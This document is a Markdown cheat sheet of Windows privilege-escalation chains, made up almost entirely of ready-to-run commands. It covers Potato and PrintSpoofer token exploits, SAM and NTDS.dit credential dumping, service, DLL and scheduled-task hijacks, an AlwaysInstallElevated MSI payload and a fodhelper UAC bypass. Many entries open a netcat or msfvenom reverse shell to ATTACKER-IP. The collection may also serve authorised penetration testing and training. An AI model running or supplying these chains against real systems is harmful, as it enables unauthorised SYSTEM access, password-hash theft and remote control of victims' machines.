# Windows Privesc Chains

## SeImpersonate → GodPotato/PrintSpoofer → SYSTEM
```powershell
# Check: whoami /priv → SeImpersonatePrivilege
.\GodPotato.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER-IP 443 -e cmd"
# Or:
.\PrintSpoofer.exe -i -c "cmd /c C:\temp\nc.exe ATTACKER-IP 443 -e cmd"
```

## SeBackup → SAM+SYSTEM dump → secretsdump → admin hash
```powershell
# Check: whoami /priv → SeBackupPrivilege
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
# Transfer to attacker:
impacket-secretsdump -sam sam -system system LOCAL
```

## Backup Operators → NTDS.dit → secretsdump
```powershell
# Member of Backup Operators group
# Use diskshadow to copy NTDS.dit:
diskshadow /s script.txt
robocopy /b E:\Windows\NTDS . ntds.dit
reg save hklm\system C:\temp\system
# Transfer and extract:
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

## Service Binary Hijack → restart → SYSTEM
```powershell
# Find writable service binary path:
icacls "C:\Program Files\VulnSvc\service.exe"
# Replace with payload:
copy C:\temp\rev.exe "C:\Program Files\VulnSvc\service.exe"
sc stop VulnSvc && sc start VulnSvc
```

## Unquoted Service Path → drop binary → SYSTEM
```powershell
# Find unquoted paths:
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
# Example path: C:\Program Files\Vuln App\service.exe
# Drop binary at: C:\Program Files\Vuln.exe
copy C:\temp\rev.exe "C:\Program Files\Vuln.exe"
sc stop VulnSvc && sc start VulnSvc
```

## DLL Hijacking
```powershell
# Use procmon to find missing DLLs loaded by a service/app
# Craft DLL with msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f dll -o hijack.dll
# Place in writable directory that's in DLL search order
# Restart service or wait for trigger
```

## AlwaysInstallElevated → msi payload → SYSTEM
```powershell
# Check both keys (both must be 1):
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Generate MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER-IP LPORT=443 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

## RunAs with Saved Credentials
```powershell
cmdkey /list
# If creds are saved:
runas /savecred /user:Administrator "cmd /c C:\temp\nc.exe ATTACKER-IP 443 -e cmd"
```

## Token Impersonation with Incognito
```powershell
# In Meterpreter:
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
# Or standalone:
.\incognito.exe list_tokens -u
.\incognito.exe execute -c "DOMAIN\Administrator" cmd.exe
```

## Scheduled Task Abuse
```powershell
# Find writable scheduled task scripts:
schtasks /query /fo LIST /v | findstr /i "Task To Run"
icacls "C:\path\to\task_script.bat"
# Replace script content with reverse shell
echo C:\temp\nc.exe ATTACKER-IP 443 -e cmd > "C:\path\to\task_script.bat"
```

## Registry AutoRun Exploitation
```powershell
# Check for writable AutoRun entries:
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
icacls "C:\Program Files\AutoRunApp\app.exe"
# Replace with payload, wait for admin login
copy C:\temp\rev.exe "C:\Program Files\AutoRunApp\app.exe"
```

## UAC Bypass
```powershell
# fodhelper.exe bypass:
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd /c C:\temp\rev.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process fodhelper.exe
```

## JuicyPotato / RoguePotato / SweetPotato
```powershell
# SeImpersonate or SeAssignPrimaryToken required
# JuicyPotato (older Windows):
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe ATTACKER-IP 443 -e cmd" -t *
# SweetPotato (modern):
.\SweetPotato.exe -a "cmd /c C:\temp\nc.exe ATTACKER-IP 443 -e cmd"
```
